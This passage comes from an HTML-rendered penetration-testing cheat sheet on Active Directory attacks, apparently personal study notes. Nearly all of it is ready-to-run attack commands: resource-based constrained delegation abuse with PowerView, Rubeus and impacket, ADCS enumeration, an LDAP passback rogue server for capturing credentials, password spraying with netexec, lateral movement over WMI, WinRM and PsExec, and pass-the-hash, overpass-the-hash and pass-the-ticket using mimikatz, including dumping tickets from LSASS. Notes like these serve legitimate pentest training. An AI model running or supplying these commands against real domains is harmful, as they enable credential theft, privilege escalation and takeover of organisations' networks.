</span><span id="__span-91-13"><a id="__codelineno-91-13" name="__codelineno-91-13" href="#__codelineno-91-13"></a><span class="nv">$ID</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">Security</span><span class="p">.</span><span class="n">Principal</span><span class="p">.</span><span class="n">SecurityIdentifier</span><span class="p">(</span><span class="nv">$SID</span><span class="p">)</span>
</span><span id="__span-91-14"><a id="__codelineno-91-14" name="__codelineno-91-14" href="#__codelineno-91-14"></a><span class="nv">$ACE</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectoryAccessRule</span><span class="p">(</span><span class="nv">$ID</span><span class="p">,</span> <span class="s2">&quot;GenericAll&quot;</span><span class="p">,</span> <span class="s2">&quot;Allow&quot;</span><span class="p">)</span>
</span><span id="__span-91-15"><a id="__codelineno-91-15" name="__codelineno-91-15" href="#__codelineno-91-15"></a><span class="nv">$SD</span><span class="p">.</span><span class="n">AddAccessRule</span><span class="p">(</span><span class="nv">$ACE</span><span class="p">)</span>
</span><span id="__span-91-16"><a id="__codelineno-91-16" name="__codelineno-91-16" href="#__codelineno-91-16"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">victim-computer</span> <span class="n">-Set</span> <span class="p">@{</span><span class="s1">&#39;msDS-AllowedToActOnBehalfOfOtherIdentity&#39;</span><span class="p">=</span><span class="nv">$SD</span><span class="p">}</span>
</span><span id="__span-91-17"><a id="__codelineno-91-17" name="__codelineno-91-17" href="#__codelineno-91-17"></a>
</span><span id="__span-91-18"><a id="__codelineno-91-18" name="__codelineno-91-18" href="#__codelineno-91-18"></a><span class="c"># Or use PowerView&#39;s shortcut if you control the user:</span>
</span><span id="__span-91-19"><a id="__codelineno-91-19" name="__codelineno-91-19" href="#__codelineno-91-19"></a><span class="nb">Set-DomainObject</span> <span class="n">-Identity</span> <span class="n">victim-computer</span> <span class="n">-Set</span> <span class="p">@{</span><span class="err">‘</span><span class="n">msDS-AllowedToActOnBehalfOfOtherIdentity</span><span class="err">’</span> <span class="p">=</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">System</span><span class="p">.</span><span class="n">DirectoryServices</span><span class="p">.</span><span class="n">ActiveDirectorySecurity</span><span class="p">).</span><span class="n">GetSecurityDescriptorSddlForm</span><span class="p">(</span><span class="err">‘</span><span class="n">All</span><span class="err">’</span><span class="p">)}</span>
</span><span id="__span-91-20"><a id="__codelineno-91-20" name="__codelineno-91-20" href="#__codelineno-91-20"></a>
</span><span id="__span-91-21"><a id="__codelineno-91-21" name="__codelineno-91-21" href="#__codelineno-91-21"></a><span class="c"># Step 2: Perform impersonation:</span>
</span><span id="__span-91-22"><a id="__codelineno-91-22" name="__codelineno-91-22" href="#__codelineno-91-22"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">eviluser</span> <span class="p">/</span><span class="n">rc4</span><span class="p">:&lt;</span><span class="n">NTLM</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">victim-computer</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span><span id="__span-91-23"><a id="__codelineno-91-23" name="__codelineno-91-23" href="#__codelineno-91-23"></a>
</span><span id="__span-91-24"><a id="__codelineno-91-24" name="__codelineno-91-24" href="#__codelineno-91-24"></a><span class="c"># Kali Linux (Steps):</span>
</span><span id="__span-91-25"><a id="__codelineno-91-25" name="__codelineno-91-25" href="#__codelineno-91-25"></a>
</span><span id="__span-91-26"><a id="__codelineno-91-26" name="__codelineno-91-26" href="#__codelineno-91-26"></a><span class="c"># 0. Prerequisites:</span>
</span><span id="__span-91-27"><a id="__codelineno-91-27" name="__codelineno-91-27" href="#__codelineno-91-27"></a><span class="c"># You need:</span>
</span><span id="__span-91-28"><a id="__codelineno-91-28" name="__codelineno-91-28" href="#__codelineno-91-28"></a><span class="c"># - A machine account under your control (you can create one)</span>
</span><span id="__span-91-29"><a id="__codelineno-91-29" name="__codelineno-91-29" href="#__codelineno-91-29"></a><span class="c"># - Write access to victim computer object</span>
</span><span id="__span-91-30"><a id="__codelineno-91-30" name="__codelineno-91-30" href="#__codelineno-91-30"></a>
</span><span id="__span-91-31"><a id="__codelineno-91-31" name="__codelineno-91-31" href="#__codelineno-91-31"></a><span class="c"># 1. Create a new machine account:</span>
</span><span id="__span-91-32"><a id="__codelineno-91-32" name="__codelineno-91-32" href="#__codelineno-91-32"></a><span class="n">impacket-addcomputer</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/&lt;</span><span class="n">user</span><span class="p">&gt;:&lt;</span><span class="n">pass</span><span class="p">&gt;</span> <span class="n">-computer-name</span> <span class="s1">&#39;evilcomp$&#39;</span> <span class="n">-computer-pass</span> <span class="s1">&#39;Ev!lp455&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">ip</span><span class="p">&gt;</span>
</span><span id="__span-91-33"><a id="__codelineno-91-33" name="__codelineno-91-33" href="#__codelineno-91-33"></a>
</span><span id="__span-91-34"><a id="__codelineno-91-34" name="__codelineno-91-34" href="#__codelineno-91-34"></a><span class="c"># 2. Abuse RBCD by updating victim&#39;s msDS-AllowedToActOnBehalfOfOtherIdentity attribute:</span>
</span><span id="__span-91-35"><a id="__codelineno-91-35" name="__codelineno-91-35" href="#__codelineno-91-35"></a><span class="c"># (This allows &#39;evilcomp&#39; to delegate to the victim machine)</span>
</span><span id="__span-91-36"><a id="__codelineno-91-36" name="__codelineno-91-36" href="#__codelineno-91-36"></a><span class="n">impacket-rbcd</span> <span class="n">-action</span> <span class="nb">write </span><span class="n">-delegate-from</span> <span class="s1">&#39;evilcomp$&#39;</span> <span class="n">-delegate-to</span> <span class="s1">&#39;victim-comp$&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dc-ip</span><span class="p">&gt;</span> <span class="n">domain</span><span class="p">.</span><span class="n">local</span><span class="p">/&lt;</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">-password</span> <span class="p">&lt;</span><span class="n">pass</span><span class="p">&gt;</span>
</span><span id="__span-91-37"><a id="__codelineno-91-37" name="__codelineno-91-37" href="#__codelineno-91-37"></a>
</span><span id="__span-91-38"><a id="__codelineno-91-38" name="__codelineno-91-38" href="#__codelineno-91-38"></a><span class="c"># 3. Use s4u2self + s4u2proxy to impersonate DA to the victim:</span>
</span><span id="__span-91-39"><a id="__codelineno-91-39" name="__codelineno-91-39" href="#__codelineno-91-39"></a><span class="n">impacket-getTGT</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/</span><span class="n">evilcomp</span><span class="p">\$:</span><span class="s1">&#39;P@ssw0rd!&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dc-ip</span><span class="p">&gt;</span>
</span><span id="__span-91-40"><a id="__codelineno-91-40" name="__codelineno-91-40" href="#__codelineno-91-40"></a>
</span><span id="__span-91-41"><a id="__codelineno-91-41" name="__codelineno-91-41" href="#__codelineno-91-41"></a><span class="c"># we can directly get service ticket to get access to cifs which is needed in case of psexec or wmiexec</span>
</span><span id="__span-91-42"><a id="__codelineno-91-42" name="__codelineno-91-42" href="#__codelineno-91-42"></a><span class="n">impacket-getST</span> <span class="n">-spn</span> <span class="n">cifs</span><span class="p">/</span><span class="n">victim-comp</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span> <span class="n">-impersonate</span> <span class="n">Administrator</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/</span><span class="n">evilcomp</span><span class="p">\$:</span><span class="s1">&#39;Ev!lp455&#39;</span> <span class="n">-dc-ip</span> <span class="p">&lt;</span><span class="n">dc-ip</span><span class="p">&gt;</span>
</span><span id="__span-91-43"><a id="__codelineno-91-43" name="__codelineno-91-43" href="#__codelineno-91-43"></a>
</span><span id="__span-91-44"><a id="__codelineno-91-44" name="__codelineno-91-44" href="#__codelineno-91-44"></a><span class="c"># 4. Pass ticket:</span>
</span><span id="__span-91-45"><a id="__codelineno-91-45" name="__codelineno-91-45" href="#__codelineno-91-45"></a><span class="n">export</span> <span class="n">KRB5CCNAME</span><span class="p">=</span><span class="n">Administrator</span><span class="p">.</span><span class="n">ccache</span>
</span><span id="__span-91-46"><a id="__codelineno-91-46" name="__codelineno-91-46" href="#__codelineno-91-46"></a><span class="n">klist</span> <span class="c"># to check ticket loaded in the memory</span>
</span><span id="__span-91-47"><a id="__codelineno-91-47" name="__codelineno-91-47" href="#__codelineno-91-47"></a><span class="n">impacket-psexec</span> <span class="n">-k</span> <span class="n">-no-pass</span> <span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;/</span><span class="n">Administrator</span><span class="nv">@victim</span><span class="n">-comp</span><span class="p">.</span><span class="n">domain</span><span class="p">.</span><span class="n">local</span>
</span></code></pre></div>
<hr />
<h4 id="adcs-attacks">ADCS Attacks</h4>
<p><div class="language-shell highlight"><pre><span></span><code><span id="__span-92-1"><a id="__codelineno-92-1" name="__codelineno-92-1" href="#__codelineno-92-1"></a>certipy-ad<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span>pieter<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;relayboy22!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.188.161
</span><span id="__span-92-2"><a id="__codelineno-92-2" name="__codelineno-92-2" href="#__codelineno-92-2"></a>
</span><span id="__span-92-3"><a id="__codelineno-92-3" name="__codelineno-92-3" href="#__codelineno-92-3"></a><span class="c1"># We can search for ESC attack vectors</span>
</span></code></pre></div>
Learn More about it
- <a href="https://www.linkedin.com/pulse/attack-vectors-against-active-directory-certificate-services-patel-bpcyf/">Linkedin Blog</a>
- <a href="https://www.youtube.com/playlist?list=PLUMEY7cBcvDP19HB3qoBO6uTp-wxDFbFX">All the ADCS attacks YouTube</a></p>
<h4 id="ldap-passback-attack">LDAP Passback Attack</h4>
<p>If we identify a service or device configured to connect to an external LDAP server, we can exploit this by replacing the LDAP IP with our own. This allows us to capture credentials via a rogue LDAP server that supports plaintext authentication.
<div class="language-shell highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a><span class="c1"># Clone this repo [LDAP-passback-docker](https://github.com/pedrojosenavasperez/ldap-passback-docker)</span>
</span><span id="__span-93-2"><a id="__codelineno-93-2" name="__codelineno-93-2" href="#__codelineno-93-2"></a>docker<span class="w"> </span>build<span class="w"> </span>-t<span class="w"> </span>ldap-passback<span class="w"> </span>.
</span><span id="__span-93-3"><a id="__codelineno-93-3" name="__codelineno-93-3" href="#__codelineno-93-3"></a>docker<span class="w"> </span>run<span class="w"> </span>--rm<span class="w"> </span>-ti<span class="w"> </span>-p<span class="w"> </span><span class="m">389</span>:389<span class="w"> </span>ldap-passback<span class="w">  </span><span class="c1"># this also captures the credentials and display it properly </span>
</span><span id="__span-93-4"><a id="__codelineno-93-4" name="__codelineno-93-4" href="#__codelineno-93-4"></a>
</span><span id="__span-93-5"><a id="__codelineno-93-5" name="__codelineno-93-5" href="#__codelineno-93-5"></a><span class="c1"># With your rogue LDAP server running, run the below command to capture the ldap traffic to see the password</span>
</span><span id="__span-93-6"><a id="__codelineno-93-6" name="__codelineno-93-6" href="#__codelineno-93-6"></a>tshark<span class="w"> </span>-i<span class="w"> </span>any<span class="w"> </span>-f<span class="w"> </span><span class="s2">&quot;port 389&quot;</span><span class="w"> </span>-Y<span class="w"> </span><span class="s2">&quot;ldap.simple&quot;</span><span class="w"> </span>-V
</span></code></pre></div></p>
<h3 id="lateral-movement-in-ad">🚶‍♂️Lateral Movement in  AD</h3>
<p>Check: https://www.netexec.wiki/ for more details</p>
<h4 id="initial-access_1">Initial Access</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a><span class="c1"># Use netexec to spray to SMB, winrm service, rdp</span>
</span><span id="__span-94-2"><a id="__codelineno-94-2" name="__codelineno-94-2" href="#__codelineno-94-2"></a><span class="c1"># Before doing that, check the password policy using `net accounts`</span>
</span><span id="__span-94-3"><a id="__codelineno-94-3" name="__codelineno-94-3" href="#__codelineno-94-3"></a>net<span class="w"> </span>accounts
</span><span id="__span-94-4"><a id="__codelineno-94-4" name="__codelineno-94-4" href="#__codelineno-94-4"></a>
</span><span id="__span-94-5"><a id="__codelineno-94-5" name="__codelineno-94-5" href="#__codelineno-94-5"></a>netexec<span class="w"> </span>smb<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>--continue-on-success
</span><span id="__span-94-6"><a id="__codelineno-94-6" name="__codelineno-94-6" href="#__codelineno-94-6"></a>netexec<span class="w"> </span>winrm<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>--continue-on-success
</span><span id="__span-94-7"><a id="__codelineno-94-7" name="__codelineno-94-7" href="#__codelineno-94-7"></a>netexec<span class="w"> </span>rdp<span class="w"> </span>&lt;ip-range&gt;<span class="w"> </span>-u<span class="w"> </span>user.txt<span class="w"> </span>-p<span class="w"> </span>pass.txt<span class="w"> </span>-d<span class="w"> </span>corp.com<span class="w"> </span>--continue-on-success<span class="w"> </span>--screenshot<span class="w"> </span>--screentime<span class="w"> </span>&lt;time&gt;<span class="w"> </span><span class="c1"># --nla-screenshot</span>
</span><span id="__span-94-8"><a id="__codelineno-94-8" name="__codelineno-94-8" href="#__codelineno-94-8"></a><span class="c1"># no bruteforce for pass spraying</span>
</span><span id="__span-94-9"><a id="__codelineno-94-9" name="__codelineno-94-9" href="#__codelineno-94-9"></a>--no-bruteforce<span class="w"> </span>--continue-on-success
</span><span id="__span-94-10"><a id="__codelineno-94-10" name="__codelineno-94-10" href="#__codelineno-94-10"></a>
</span><span id="__span-94-11"><a id="__codelineno-94-11" name="__codelineno-94-11" href="#__codelineno-94-11"></a>RunasCs.exe<span class="w"> </span>user1<span class="w"> </span>password1<span class="w"> </span><span class="s2">&quot;cmd /c whoami /all&quot;</span>
</span><span id="__span-94-12"><a id="__codelineno-94-12" name="__codelineno-94-12" href="#__codelineno-94-12"></a>
</span><span id="__span-94-13"><a id="__codelineno-94-13" name="__codelineno-94-13" href="#__codelineno-94-13"></a>.<span class="w"> </span>.<span class="se">\I</span>noke-RunasCS
</span><span id="__span-94-14"><a id="__codelineno-94-14" name="__codelineno-94-14" href="#__codelineno-94-14"></a>Invoke-RunasCs<span class="w"> </span>-Username<span class="w"> </span>svc_mssql<span class="w"> </span>-Password<span class="w"> </span>trustno1<span class="w"> </span>-Command<span class="w"> </span><span class="s2">&quot;whoami&quot;</span>
</span></code></pre></div>
<h4 id="wmi-port-135">WMI (port 135)</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a><span class="c1"># 🚶 Via WMI (135), Target user needs to be in any admin group membership is required and UAC doesn&#39;t apply on Domain users so we can get full access</span>
</span><span id="__span-95-2"><a id="__codelineno-95-2" name="__codelineno-95-2" href="#__codelineno-95-2"></a><span class="c1"># using cmd</span>
</span><span id="__span-95-3"><a id="__codelineno-95-3" name="__codelineno-95-3" href="#__codelineno-95-3"></a>wmic<span class="w"> </span>/node:192.168.50.73<span class="w"> </span>/user:jen<span class="w"> </span>/password:Nexus123!<span class="w"> </span>process<span class="w"> </span>call<span class="w"> </span>create<span class="w"> </span><span class="s2">&quot;calc&quot;</span><span class="w"> </span><span class="c1"># windows target</span>
</span><span id="__span-95-4"><a id="__codelineno-95-4" name="__codelineno-95-4" href="#__codelineno-95-4"></a><span class="c1"># using powershell</span>
</span><span id="__span-95-5"><a id="__codelineno-95-5" name="__codelineno-95-5" href="#__codelineno-95-5"></a><span class="nv">$secureString</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>ConvertTo-SecureString<span class="w"> </span><span class="s1">&#39;pass&#39;</span><span class="w"> </span>-AsPlaintext<span class="w"> </span>-Force<span class="p">;</span>
</span><span id="__span-95-6"><a id="__codelineno-95-6" name="__codelineno-95-6" href="#__codelineno-95-6"></a><span class="nv">$credential</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Object<span class="w"> </span>System.Management.Automation.PSCredential<span class="w"> </span><span class="s1">&#39;user&#39;</span>,<span class="w"> </span><span class="nv">$secureString</span><span class="p">;</span>
</span><span id="__span-95-7"><a id="__codelineno-95-7" name="__codelineno-95-7" href="#__codelineno-95-7"></a><span class="nv">$options</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-CimSessionOption<span class="w"> </span>-Protocol<span class="w"> </span>DCOM
</span><span id="__span-95-8"><a id="__codelineno-95-8" name="__codelineno-95-8" href="#__codelineno-95-8"></a><span class="nv">$session</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>New-Cimsession<span class="w"> </span>-ComputerName<span class="w"> </span><span class="m">192</span>.168.50.73<span class="w"> </span>-Credential<span class="w"> </span><span class="nv">$credential</span><span class="w"> </span>-SessionOption<span class="w"> </span><span class="nv">$Options</span><span class="w"> </span>
</span><span id="__span-95-9"><a id="__codelineno-95-9" name="__codelineno-95-9" href="#__codelineno-95-9"></a><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;calc&#39;</span><span class="p">;</span>
</span><span id="__span-95-10"><a id="__codelineno-95-10" name="__codelineno-95-10" href="#__codelineno-95-10"></a>Invoke-CimMethod<span class="w"> </span>-CimSession<span class="w"> </span><span class="nv">$Session</span><span class="w"> </span>-ClassName<span class="w"> </span>Win32_Process<span class="w"> </span>-MethodName<span class="w"> </span>Create<span class="w"> </span>-Arguments<span class="w"> </span>@<span class="o">{</span><span class="nv">CommandLine</span><span class="w"> </span><span class="o">=</span><span class="nv">$Command</span><span class="o">}</span><span class="p">;</span>
</span><span id="__span-95-11"><a id="__codelineno-95-11" name="__codelineno-95-11" href="#__codelineno-95-11"></a><span class="c1"># in kali</span>
</span><span id="__span-95-12"><a id="__codelineno-95-12" name="__codelineno-95-12" href="#__codelineno-95-12"></a>impacket-wmiexec<span class="w"> </span>test.local/john:password123@10.10.10.1
</span></code></pre></div>
<h4 id="winrm-5985-5986">WinRM (5985, 5986)</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a><span class="c1"># 🚶 Via WinRM (5985,5986), domain user needs to be member of Administrators or Remote Management Users group on the target host.</span>
</span><span id="__span-96-2"><a id="__codelineno-96-2" name="__codelineno-96-2" href="#__codelineno-96-2"></a><span class="c1"># using cmd</span>
</span><span id="__span-96-3"><a id="__codelineno-96-3" name="__codelineno-96-3" href="#__codelineno-96-3"></a>winrs<span class="w"> </span>-r:files04<span class="w"> </span>-u:jen<span class="w"> </span>-p:Nexus123!<span class="w">  </span><span class="s2">&quot;cmd /c hostname &amp; whoami&quot;</span><span class="w">  </span><span class="c1"># domain user can only run this</span>
</span><span id="__span-96-4"><a id="__codelineno-96-4" name="__codelineno-96-4" href="#__codelineno-96-4"></a><span class="c1"># using powershell</span>
</span><span id="__span-96-5"><a id="__codelineno-96-5" name="__codelineno-96-5" href="#__codelineno-96-5"></a>New-PSSession<span class="w"> </span>-ComputerName<span class="w"> </span><span class="m">192</span>.168.50.73<span class="w"> </span>-Credential<span class="w"> </span><span class="nv">$credential</span>
</span><span id="__span-96-6"><a id="__codelineno-96-6" name="__codelineno-96-6" href="#__codelineno-96-6"></a>Enter-PSSession<span class="w"> </span>&lt;ID&gt;<span class="w"> </span><span class="c1"># ID number generated from above </span>
</span><span id="__span-96-7"><a id="__codelineno-96-7" name="__codelineno-96-7" href="#__codelineno-96-7"></a><span class="c1"># in kali</span>
</span><span id="__span-96-8"><a id="__codelineno-96-8" name="__codelineno-96-8" href="#__codelineno-96-8"></a>evil-winrm<span class="w">  </span>-i<span class="w"> </span><span class="m">192</span>.168.1.100<span class="w"> </span>-u<span class="w"> </span>Administrator<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;MySuperSecr3tPass123!&#39;</span><span class="w"> </span>-s<span class="w"> </span><span class="s1">&#39;/home/foo/ps1_scripts/&#39;</span><span class="w"> </span>-e<span class="w"> </span><span class="s1">&#39;/home/foo/exe_files/&#39;</span>
</span></code></pre></div>
<h4 id="psexec-smb">PsExec (SMB)</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a><span class="c1"># 🚶 Via psexec (SMB), target user should have Local Admin, ADMIN$ share available and File and Printer Sharing has to be turned on</span>
</span><span id="__span-97-2"><a id="__codelineno-97-2" name="__codelineno-97-2" href="#__codelineno-97-2"></a><span class="c1"># using cmd</span>
</span><span id="__span-97-3"><a id="__codelineno-97-3" name="__codelineno-97-3" href="#__codelineno-97-3"></a>.<span class="se">\P</span>sExec64.exe<span class="w"> </span>-i<span class="w">  </span><span class="se">\\</span>FILES04<span class="w"> </span>-u<span class="w"> </span>corp<span class="se">\j</span>en<span class="w"> </span>-p<span class="w"> </span>Nexus123!<span class="w"> </span>cmd
</span><span id="__span-97-4"><a id="__codelineno-97-4" name="__codelineno-97-4" href="#__codelineno-97-4"></a><span class="c1"># in kali</span>
</span><span id="__span-97-5"><a id="__codelineno-97-5" name="__codelineno-97-5" href="#__codelineno-97-5"></a>impacket-psexec<span class="w"> </span>CORP/Administrator:pass@192.168.50.21
</span></code></pre></div>
<h4 id="pass-the-hash">Pass The Hash</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a><span class="c1"># 🚶 Pass The Hash </span>
</span><span id="__span-98-2"><a id="__codelineno-98-2" name="__codelineno-98-2" href="#__codelineno-98-2"></a><span class="c1"># supported by PsExec, impacket tools and [pth toolkit](https://github.com/byt3bl33d3r/pth-toolkit)</span>
</span><span id="__span-98-3"><a id="__codelineno-98-3" name="__codelineno-98-3" href="#__codelineno-98-3"></a>use<span class="w"> </span>-hashes<span class="w"> </span><span class="k">in</span><span class="w"> </span>any<span class="w"> </span>impacket<span class="w"> </span>tools
</span></code></pre></div>
<h4 id="overpass-the-hash-request-tgttgs-using-hash">OverPass The Hash - Request TGT/TGS using Hash</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a><span class="c1"># 🚶 OverPass the Hash, Request TGT and TGS using domain user&#39;s NTLM hash </span>
</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a><span class="c1"># if NTLM is disabled, If you get STATUS_INVALID_LOGON_TYPE or NTLM blocked → NTLM is disabled during login through SMB service</span>
</span><span id="__span-99-3"><a id="__codelineno-99-3" name="__codelineno-99-3" href="#__codelineno-99-3"></a>mimikatz<span class="w"> </span>sekurlsa::pth<span class="w"> </span>/user:jen<span class="w"> </span>/domain:corp.com<span class="w"> </span>/ntlm:369def79d8372408bf6e93364cc93075<span class="w"> </span>/run:powershell
</span><span id="__span-99-4"><a id="__codelineno-99-4" name="__codelineno-99-4" href="#__codelineno-99-4"></a>whoami<span class="w"> </span><span class="c1"># won&#39;t show new user as kerberos ticket requested so use any service then klist</span>
</span><span id="__span-99-5"><a id="__codelineno-99-5" name="__codelineno-99-5" href="#__codelineno-99-5"></a>net<span class="w"> </span>use<span class="w"> </span><span class="se">\\</span>files04<span class="w"> </span>OR<span class="w"> </span>.<span class="se">\P</span>sExec.exe<span class="w"> </span><span class="se">\\</span>files04<span class="w"> </span>cmd<span class="w"> </span>OR<span class="w"> </span>any<span class="w"> </span>cmd
</span><span id="__span-99-6"><a id="__codelineno-99-6" name="__codelineno-99-6" href="#__codelineno-99-6"></a><span class="c1"># winrs will gonna through error on this</span>
</span><span id="__span-99-7"><a id="__codelineno-99-7" name="__codelineno-99-7" href="#__codelineno-99-7"></a>klist
</span><span id="__span-99-8"><a id="__codelineno-99-8" name="__codelineno-99-8" href="#__codelineno-99-8"></a><span class="c1"># if we have rc4, aes128 or aes256  then use /hashname:  in mimikatz</span>
</span><span id="__span-99-9"><a id="__codelineno-99-9" name="__codelineno-99-9" href="#__codelineno-99-9"></a>
</span><span id="__span-99-10"><a id="__codelineno-99-10" name="__codelineno-99-10" href="#__codelineno-99-10"></a><span class="c1"># in kali, OPth</span>
</span><span id="__span-99-11"><a id="__codelineno-99-11" name="__codelineno-99-11" href="#__codelineno-99-11"></a>impacket-getTGT<span class="w"> </span>-hashes<span class="w"> </span>:11223344556677889900aabbccddeeff<span class="w"> </span>corp.com/Administrator<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.238.7<span class="w"> </span><span class="c1"># &gt; Using an incorrect domain format (e.g., `corp/` instead of `corp.com/`) can cause a `STATUS_MORE_PROCESSING_REQUIRED` error when using the TGT with tools like `impacket-psexec`.</span>
</span><span id="__span-99-12"><a id="__codelineno-99-12" name="__codelineno-99-12" href="#__codelineno-99-12"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>Administrator.ccache<span class="w">  </span><span class="c1"># export the ticket to env</span>
</span><span id="__span-99-13"><a id="__codelineno-99-13" name="__codelineno-99-13" href="#__codelineno-99-13"></a>klist<span class="w"> </span>
</span><span id="__span-99-14"><a id="__codelineno-99-14" name="__codelineno-99-14" href="#__codelineno-99-14"></a>impacket-psexec<span class="w"> </span>-k<span class="w"> </span>corp.com/Administrator@hostname.corp.com<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">192</span>.168.238.70<span class="w"> </span>-no-pass<span class="w"> </span><span class="c1"># -k for kerberos auth and hostname requires in kerb auth</span>
</span><span id="__span-99-15"><a id="__codelineno-99-15" name="__codelineno-99-15" href="#__codelineno-99-15"></a><span class="c1"># in order to setup your kali to use DC as dns for specific domain check out [[Linux &amp; Windows commands#setting up dnsmasq]]</span>
</span></code></pre></div>
<h4 id="pass-the-ticket">Pass The Ticket</h4>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a><span class="c1"># 🚶 Pass the Ticket, requires admin rights to dump tickts from lsass</span>
</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a><span class="c1"># impersonate any user through injecting their tickets (TGS or TGT) into our session from LSASS memory</span>
</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>mimikatz&gt;<span class="w"> </span>privilege::debug
</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>sekurlsa::tickets<span class="w"> </span>/export<span class="w">   </span><span class="c1"># dumps any TGT or TGS from LSASS memory and saves in *.kirbi</span>
</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a><span class="c1"># We can see which user has which TGS by analyzing the naming convention of `.kirbi` files.</span>
</span><span id="__span-100-6"><a id="__codelineno-100-6" name="__codelineno-100-6" href="#__codelineno-100-6"></a><span class="c1"># to inject any high privileged Ticket into our current session</span>
</span><span id="__span-100-7"><a id="__codelineno-100-7" name="__codelineno-100-7" href="#__codelineno-100-7"></a>kerberos::ptt<span class="w"> </span><span class="o">[</span><span class="m">0</span><span class="p">;</span>12bd0<span class="o">]</span>-0-0-40810000-dave@cifs-web04.kirbi<span class="w">  </span><span class="c1"># (TGS used here) we can also use TGT too </span>
</span><span id="__span-100-8"><a id="__codelineno-100-8" name="__codelineno-100-8" href="#__codelineno-100-8"></a>klist<span class="w"> </span><span class="c1"># to check tickets in our session</span>
</span><span id="__span-100-9"><a id="__codelineno-100-9" name="__codelineno-100-9" href="#__codelineno-100-9"></a>
</span><span id="__span-100-10"><a id="__codelineno-100-10" name="__codelineno-100-10" href="#__codelineno-100-10"></a><span class="c1"># In Kali</span>
</span><span id="__span-100-11"><a id="__codelineno-100-11" name="__codelineno-100-11" href="#__codelineno-100-11"></a>python3<span class="w"> </span>ticketConverter.py<span class="w"> </span>dave@cifs-web04.kirbi<span class="w"> </span>dave-web04.ccache<span class="w"> </span><span class="c1"># first convert the kirbi to ccache (supported by kali)</span>
</span><span id="__span-100-12"><a id="__codelineno-100-12" name="__codelineno-100-12" href="#__codelineno-100-12"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>/dave@cifs-web04.ccache<span class="w">   </span><span class="c1"># TGT can be used here, TESTED</span>
</span><span id="__span-100-13"><a id="__codelineno-100-13" name="__codelineno-100-13" href="#__codelineno-100-13"></a>klist
